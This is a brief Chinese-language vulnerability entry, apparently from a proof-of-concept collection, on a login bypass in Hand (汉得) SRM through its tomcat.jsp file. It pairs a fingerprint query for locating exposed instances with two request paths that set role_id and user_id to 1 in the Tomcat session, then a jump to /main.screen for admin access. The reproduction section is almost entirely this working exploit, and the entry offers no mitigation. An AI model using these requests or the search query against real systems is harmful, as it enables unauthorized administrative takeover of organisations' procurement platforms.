# 汉得SRM tomcat.jsp 登陆绕过漏洞

## 漏洞描述

汉得SRM tomcat.jsp 文件存在登陆绕过漏洞, 攻击者通过发送请求包，可以获取后台管理员权限

## 漏洞影响

<a-checkbox checked>汉得SRM </a-checkbox></br>

## 网络测绘

<a-checkbox checked>web.body="汉得SRM"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1686046062155-51fc2944-47d1-40c2-ac6e-c0dfa7c7e180.png)

验证POC (Tomcat session操控)

```plain
/tomcat.jsp?dataName=role_id&dataValue=1
/tomcat.jsp?dataName=user_id&dataValue=1
```

![img](../../../.vuepress/public/img/1686046136394-1bd2fed1-a82b-485c-a50a-d292ea08ad4c.png)

访问跳转后台

```plain
/main.screen
```